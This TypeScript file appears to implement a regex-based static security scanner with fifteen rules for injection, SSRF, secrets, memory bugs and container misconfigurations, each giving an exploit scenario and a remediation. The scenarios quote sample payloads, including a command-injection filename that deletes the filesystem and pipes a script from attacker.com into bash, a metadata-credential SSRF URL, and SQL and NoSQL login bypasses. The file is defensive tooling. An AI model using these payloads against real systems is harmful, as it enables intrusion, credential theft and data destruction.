import { Vulnerability, OWASPCategory, Severity } from '../types';

interface RuleDefinition {
  id: string;
  name: string;
  languages: string[];
  severity: Severity;
  owaspCategory: OWASPCategory;
  cwe: string;
  cvssScore: number;
  regex: RegExp;
  description: string;
  impact: string;
  exploitScenario: string;
  remediation: string;
  confidence: 'HIGH' | 'MEDIUM' | 'LOW';
  taintTraceGen?: (match: string, line: number) => {
    source: string;
    sink: string;
    flowDescription: string;
  };
}

export const STATIC_SECURITY_RULES: RuleDefinition[] = [
  // 1. Python SQL Injection
  {
    id: 'SEC-PY-001',
    name: 'SQL Injection via String Formatting / Concatenation',
    languages: ['python'],
    severity: 'CRITICAL',
    owaspCategory: 'A03:2021-Injection',
    cwe: 'CWE-89',
    cvssScore: 9.8,
    regex: /(execute|raw|query)\s*\(\s*f["'].*SELECT|cursor\.execute\s*\(\s*f?["'].*WHERE.*\{\w+\}/i,
    description: 'Dynamic SQL query constructed via f-strings or string interpolation allows attackers to alter query logic and dump or modify database contents.',
    impact: 'Complete database compromise, unauthorized data extraction, and potential remote code execution via database UDFs.',
    exploitScenario: 'An attacker inputs `\' OR \'1\'=\'1` or `\' UNION SELECT username, password_hash FROM admin_users --` to bypass authorization and leak all user accounts.',
    remediation: 'Use parameterized queries (e.g. `cursor.execute("SELECT ... WHERE user_id = ?", (user_id,))`) or an ORM like SQLAlchemy / Prisma.',
    confidence: 'HIGH',
    taintTraceGen: (match, line) => ({
      source: 'request.args.get("user_id") or untrusted HTTP parameter',
      sink: `cursor.execute(...) at line ${line}`,
      flowDescription: 'Untrusted user input flows directly into unparameterized SQL statement string buffer.'
    })
  },
  // 2. Python SSRF
  {
    id: 'SEC-PY-002',
    name: 'Server-Side Request Forgery (SSRF) via requests.post/get',
    languages: ['python'],
    severity: 'HIGH',
    owaspCategory: 'A10:2021-Server-Side Request Forgery (SSRF)',
    cwe: 'CWE-918',
    cvssScore: 8.6,
    regex: /requests\.(get|post|put|delete)\s*\(\s*(webhook_url|url|target_url|callback_url|data\.get\([^)]+\))/i,
    description: 'Directly dispatching HTTP requests to an unvalidated user-supplied URL allows malicious actors to target internal cloud infrastructure and VPC-only endpoints.',
    impact: 'Exfiltration of Cloud Instance Metadata (IAM credentials at 169.254.169.254), internal port scanning, and pivoting into internal Kubernetes services.',
    exploitScenario: 'Attacker supplies `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as the webhook URL to steal AWS/GCP service account tokens.',
    remediation: 'Enforce strict URL allowlists, validate IP resolution to ban RFC-1918 private ranges and link-local metadata addresses (169.254.169.254), or use an isolated outbound proxy.',
    confidence: 'HIGH',
    taintTraceGen: (match, line) => ({
      source: 'JSON request payload (`callback_url`)',
      sink: `requests.post(webhook_url) at line ${line}`,
      flowDescription: 'Unvalidated URL is requested by the backend server, exposing internal VPC services.'
    })
  },
  // 3. Python OS Command Injection
  {
    id: 'SEC-PY-003',
    name: 'OS Command Injection via os.system / subprocess',
    languages: ['python'],
    severity: 'CRITICAL',
    owaspCategory: 'A03:2021-Injection',
    cwe: 'CWE-78',
    cvssScore: 9.8,
    regex: /os\.system\s*\(\s*f?["'].*\{|subprocess\.(call|Popen|run)\s*\(\s*f?["'].*shell\s*=\s*True/i,
    description: 'Passing untrusted strings to the system shell allows arbitrary OS command execution with the privileges of the application process.',
    impact: 'Full host system takeover, reverse shell spawning, lateral movement across the cloud cluster.',
    exploitScenario: 'Attacker provides `test; rm -rf /; curl http://attacker.com/rev.sh | bash` as the filename.',
    remediation: 'Avoid `shell=True` and `os.system()`. Use `subprocess.run(["tar", "-czf", output_file, source_dir], check=True)` with an array of arguments.',
    confidence: 'HIGH'
  },
  // 4. Hardcoded Secrets
  {
    id: 'SEC-GEN-004',
    name: 'Hardcoded Secret / API Token in Source Code',
    languages: ['python', 'javascript', 'typescript', 'go', 'dockerfile', 'yaml'],
    severity: 'CRITICAL',
    owaspCategory: 'A02:2021-Cryptographic Failures',
    cwe: 'CWE-798',
    cvssScore: 8.9,
    regex: /(sk_live_[0-9a-zA-Z]{24,}|AKIA[0-9A-Z]{16}|AWS_SECRET_ACCESS_KEY\s*=\s*["'][^"']+["']|JWT_SECRET\s*=\s*["'][^"']+["']|DB_PASSWORD\s*=\s*["'][^"']+["']|STRIPE_API_SECRET\s*=\s*["'][^"']+["'])/i,
    description: 'Sensitive credentials, API keys, or private signing secrets are hardcoded directly in source code or container definitions.',
    impact: 'Leaked secrets can be extracted by anyone with repo or container access, allowing unauthorized access to 3rd party providers or cloud resources.',
    exploitScenario: 'Attacker inspects public commits or decompiles container image layers to obtain cloud infrastructure admin privileges.',
    remediation: 'Load secrets from environment variables (e.g. `process.env.SECRET_KEY` or `os.environ["SECRET_KEY"]`) backed by Secret Managers (Vault, AWS Secrets Manager, GCP Secret Manager).',
    confidence: 'HIGH'
  },
  // 5. JavaScript / Node Broken JWT Algorithm
  {
    id: 'SEC-JS-005',
    name: 'Insecure JWT Algorithm Verification (Algorithm Confusion / "none")',
    languages: ['javascript', 'typescript'],
    severity: 'HIGH',
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    cwe: 'CWE-347',
    cvssScore: 8.1,
    regex: /jwt\.verify\s*\([^,]+,\s*[^,]+,\s*\{\s*algorithms:\s*\[[^\]]*'none'[^\]]*\]/i,
    description: 'Allowing the "none" algorithm in JWT verification lets an attacker forge arbitrary tokens with forged claims (e.g. `{"role": "admin"}`) without possessing the secret key.',
    impact: 'Authentication bypass and unauthorized administrative access.',
    exploitScenario: 'Attacker creates a JWT header with `{"alg": "none"}` and payload `{"userId": "admin", "role": "superadmin"}`, stripping the signature to bypass verification.',
    remediation: 'Explicitly restrict algorithms to secure asymmetric/symmetric standards such as `algorithms: ["HS256"]` or `["RS256"]`, never allowing `"none"`.',
    confidence: 'HIGH'
  },
  // 6. JavaScript NoSQL Injection
  {
    id: 'SEC-JS-006',
    name: 'NoSQL Injection in MongoDB Query',
    languages: ['javascript', 'typescript'],
    severity: 'HIGH',
    owaspCategory: 'A03:2021-Injection',
    cwe: 'CWE-943',
    cvssScore: 8.5,
    regex: /findOne\s*\(\s*\{\s*username:\s*\w+,\s*password:\s*\w+\s*\}\)/i,
    description: 'Accepting raw request body objects directly into MongoDB query filters allows MongoDB query selector operators (e.g. `{"$ne": null}`, `{"$gt": ""}`) to manipulate query logic.',
    impact: 'Authentication bypass without knowing the valid password and arbitrary database document extraction.',
    exploitScenario: 'Attacker sends JSON POST `{"username": "admin", "password": {"$ne": null}}` which evaluates to true and logs in as admin.',
    remediation: 'Cast parameters to strict string primitives (`typeof password === "string"`), use schema validation (Zod/Joi), and compare passwords using hashed `bcrypt.compare()`.',
    confidence: 'HIGH'
  },
  // 7. JavaScript Prototype Pollution
  {
    id: 'SEC-JS-007',
    name: 'Prototype Pollution Vulnerability',
    languages: ['javascript', 'typescript'],
    severity: 'HIGH',
    owaspCategory: 'A06:2021-Vulnerable and Outdated Components',
    cwe: 'CWE-1321',
    cvssScore: 7.8,
    regex: /for\s*\(\s*let\s+\w+\s+in\s+\w+\s*\)\s*\{\s*\w+\[\w+\]\s*=\s*\w+\[\w+\]/i,
    description: 'Recursive or uncontrolled object property assignment without filtering `__proto__`, `constructor`, or `prototype` keys allows tampering with Object prototype properties.',
    impact: 'Application denial of service, bypass of security controls, or potential Remote Code Execution if polluted properties affect template engines.',
    exploitScenario: 'Attacker sends `{"__proto__": {"isAdmin": true}}` to grant administrative privileges across all active user sessions.',
    remediation: 'Use `Object.create(null)` or validate keys: `if (key === "__proto__" || key === "constructor" || key === "prototype") continue;` or use Map data structures.',
    confidence: 'MEDIUM'
  },
  // 8. C Buffer Overflow
  {
    id: 'SEC-C-008',
    name: 'Stack Buffer Overflow via Unbounded Memory Copy (strcpy / sprintf)',
    languages: ['c', 'cpp'],
    severity: 'CRITICAL',
    owaspCategory: 'Memory & Resource Safety',
    cwe: 'CWE-120',
    cvssScore: 9.8,
    regex: /(strcpy|strcat|sprintf|gets)\s*\(/i,
    description: 'Using unbounded string copy functions like `strcpy` or `gets` writes beyond allocated stack buffer boundaries when the input size exceeds buffer capacity.',
    impact: 'Stack memory corruption, control flow hijacking (overwriting return address / EIP/RIP registers), and arbitrary remote shellcode execution.',
    exploitScenario: 'Attacker sends 512 bytes of padding followed by a ROP chain to hijack the instruction pointer and spawn `/bin/sh`.',
    remediation: 'Replace unsafe functions with bounded alternatives such as `strncpy(dest, src, sizeof(dest) - 1)` or `snprintf()`, ensuring null-termination.',
    confidence: 'HIGH'
  },
  // 9. C Format String Vulnerability
  {
    id: 'SEC-C-009',
    name: 'Format String Vulnerability in printf',
    languages: ['c', 'cpp'],
    severity: 'HIGH',
    owaspCategory: 'Memory & Resource Safety',
    cwe: 'CWE-134',
    cvssScore: 8.8,
    regex: /printf\s*\(\s*[a-zA-Z_]\w*\s*\)\s*;/i,
    description: 'Passing user-supplied input directly as the format string argument to `printf` allows format specifiers (`%x`, `%s`, `%n`) to read stack contents and write to arbitrary memory addresses.',
    impact: 'Information disclosure (leaking ASLR canary / cryptographic keys) and arbitrary memory write resulting in code execution.',
    exploitScenario: 'Attacker provides `%x %x %x %x %s %n` to leak stack memory and overwrite GOT (Global Offset Table) entries.',
    remediation: 'Always provide an explicit format specifier: `printf("%s", user_supplied_tag);` or use `fputs(user_supplied_tag, stdout);`.',
    confidence: 'HIGH'
  },
  // 10. C Use-After-Free
  {
    id: 'SEC-C-010',
    name: 'Use-After-Free Memory Corruption',
    languages: ['c', 'cpp'],
    severity: 'HIGH',
    owaspCategory: 'Memory & Resource Safety',
    cwe: 'CWE-416',
    cvssScore: 8.1,
    regex: /free\s*\(\s*(\w+)\s*\)\s*;[\s\S]{0,60}\1\[\d+\]\s*=/i,
    description: 'Dereferencing or writing to a pointer after it has been freed (`free()`) causes undefined behavior and corrupts heap metadata.',
    impact: 'Heap corruption and potential code execution when the memory chunk is subsequently reallocated.',
    exploitScenario: 'Attacker forces heap reallocation to place controlled data into the freed slot before triggering the stale pointer write.',
    remediation: 'Nullify pointers immediately after freeing: `free(ptr); ptr = NULL;` and employ RAII / smart pointers in C++.',
    confidence: 'MEDIUM'
  },
  // 11. Dockerfile Root User
  {
    id: 'SEC-DOCKER-011',
    name: 'Container Running as Root User without Non-Root Context',
    languages: ['dockerfile'],
    severity: 'MEDIUM',
    owaspCategory: 'Cloud-Native & Container Security',
    cwe: 'CWE-250',
    cvssScore: 6.5,
    regex: /FROM\s+node|FROM\s+python|FROM\s+golang|FROM\s+ubuntu/i,
    description: 'Container executes under default root UID 0 without specifying an unprivileged `USER` directive, increasing blast radius in container breakout scenarios.',
    impact: 'If a web vulnerability is exploited, the attacker gains root privileges inside the container, facilitating host escape.',
    exploitScenario: 'Attacker exploits an RCE bug in the web application and mounts host devices or accesses Docker daemon sockets.',
    remediation: 'Add `USER node` or `USER 10001:10001` before the `CMD` instruction to enforce least-privilege.',
    confidence: 'MEDIUM'
  },
  // 12. Dockerfile Insecure Remote Script Piping
  {
    id: 'SEC-DOCKER-012',
    name: 'Insecure Remote Script Piping (curl | bash)',
    languages: ['dockerfile'],
    severity: 'HIGH',
    owaspCategory: 'A08:2021-Software and Data Integrity Failures',
    cwe: 'CWE-829',
    cvssScore: 7.9,
    regex: /curl\s+-[^|]+\|\s*(bash|sh)/i,
    description: 'Piping remote scripts directly to shell without cryptographic checksum verification exposes builds to MITM tampering and untrusted domain takeovers.',
    impact: 'Supply-chain compromise leading to malicious backdoor injection inside production container images.',
    exploitScenario: 'Attacker compromises the third-party GitHub domain or performs DNS spoofing to serve malicious shell payloads.',
    remediation: 'Download the script, verify its SHA256 cryptographic checksum, and inspect before execution.',
    confidence: 'HIGH'
  },
  // 13. Kubernetes Privileged Mode
  {
    id: 'SEC-K8S-013',
    name: 'Kubernetes Pod Running in Privileged Mode',
    languages: ['yaml'],
    severity: 'CRITICAL',
    owaspCategory: 'Cloud-Native & Container Security',
    cwe: 'CWE-269',
    cvssScore: 9.1,
    regex: /privileged:\s*true|allowPrivilegeEscalation:\s*true/i,
    description: 'Pod specification enables `privileged: true` or `allowPrivilegeEscalation: true`, disabling Linux kernel cgroup and capability isolation barriers.',
    impact: 'Container breakout to host node, access to kernel devices, full cluster node compromise.',
    exploitScenario: 'Attacker escapes the container by directly mounting the host root filesystem (`/dev/sda1`) from inside the pod.',
    remediation: 'Set `privileged: false`, `allowPrivilegeEscalation: false`, and drop all Linux capabilities (`drop: ["ALL"]`).',
    confidence: 'HIGH'
  },
  // 14. Go IDOR / Missing Object-Level Authorization
  {
    id: 'SEC-GO-014',
    name: 'Broken Object-Level Authorization (IDOR) on Resource Lookup',
    languages: ['go'],
    severity: 'HIGH',
    owaspCategory: 'A01:2021-Broken Access Control',
    cwe: 'CWE-639',
    cvssScore: 8.5,
    regex: /SELECT\s+id,\s*user_id,\s*amount.*FROM\s+orders\s+WHERE\s+id\s*=\s*'%s'/i,
    description: 'Endpoint fetches private order/account data purely based on caller-supplied `order_id` without verifying ownership against session authenticated user.',
    impact: 'Horizontal privilege escalation allowing any user to view sensitive financial data and PINs of all other users.',
    exploitScenario: 'Attacker increments order_id from 1001 to 1002 to scrape orders and PIN codes belonging to other customers.',
    remediation: 'Enforce ownership verification: `SELECT ... FROM orders WHERE id = ? AND user_id = ?` using the verified `session.UserID`.',
    confidence: 'HIGH'
  },
  // 15. Python Debug Mode in Production
  {
    id: 'SEC-PY-015',
    name: 'Flask / Framework Debug Mode Enabled',
    languages: ['python'],
    severity: 'MEDIUM',
    owaspCategory: 'A05:2021-Security Misconfiguration',
    cwe: 'CWE-489',
    cvssScore: 6.8,
    regex: /app\.run\s*\([^)]*debug\s*=\s*True/i,
    description: 'Running web applications with `debug=True` exposes interactive debugger consoles (Werkzeug PIN console) and detailed stack traces.',
    impact: 'Remote code execution via interactive console if debugger PIN is brute-forced or exposed.',
    exploitScenario: 'Attacker triggers a 500 error, opens the Werkzeug interactive console, and executes arbitrary Python code.',
    remediation: 'Use environment variables: `debug=os.environ.get("FLASK_ENV") == "development"` and deploy behind Gunicorn / uWSGI in production.',
    confidence: 'HIGH'
  }
];

export function runStaticSecurityScan(fileContent: string, language: string): Vulnerability[] {
  const findings: Vulnerability[] = [];
  const lines = fileContent.split('\n');
  const normalizedLang = language.toLowerCase();

  for (const rule of STATIC_SECURITY_RULES) {
    if (!rule.languages.includes(normalizedLang) && !rule.languages.includes('all')) {
      continue;
    }

    // Check full content or line-by-line
    const match = rule.regex.exec(fileContent);
    if (match) {
      // Find exact line number
      const matchIndex = match.index;
      let charCount = 0;
      let startLine = 1;
      let endLine = 1;

      for (let i = 0; i < lines.length; i++) {
        const lineLen = lines[i].length + 1; // +1 for newline
        if (charCount <= matchIndex && matchIndex < charCount + lineLen) {
          startLine = i + 1;
          endLine = Math.min(lines.length, startLine + 3);
          break;
        }
        charCount += lineLen;
      }

      const snippetLines = lines.slice(Math.max(0, startLine - 1), endLine);
      const snippet = snippetLines.join('\n');

      const taint = rule.taintTraceGen 
        ? rule.taintTraceGen(match[0], startLine)
        : {
            source: 'Untrusted input parameter / environment configuration',
            sink: `Sink invocation at line ${startLine}`,
            flowDescription: 'Input data reaches sensitive sink without necessary validation or sanitization.'
          };

      findings.push({
        id: `${rule.id}-${startLine}`,
        title: rule.name,
        severity: rule.severity,
        owaspCategory: rule.owaspCategory,
        cwe: rule.cwe,
        cvssScore: rule.cvssScore,
        lineStart: startLine,
        lineEnd: endLine,
        vulnerableSnippet: snippet || match[0],
        description: rule.description,
        impact: rule.impact,
        exploitScenario: rule.exploitScenario,
        remediation: rule.remediation,
        confidence: rule.confidence,
        source: 'STATIC_ANALYZER',
        taintTrace: taint
      });
    }
  }

  return findings;
}

export function calculateSecurityScore(vulnerabilities: Vulnerability[]): number {
  if (vulnerabilities.length === 0) return 100;
  
  let deductions = 0;
  for (const v of vulnerabilities) {
    switch (v.severity) {
      case 'CRITICAL': deductions += 30; break;
      case 'HIGH': deductions += 18; break;
      case 'MEDIUM': deductions += 10; break;
      case 'LOW': deductions += 4; break;
      case 'INFO': deductions += 1; break;
    }
  }
  return Math.max(0, Math.min(100, Math.round(100 - deductions)));
}
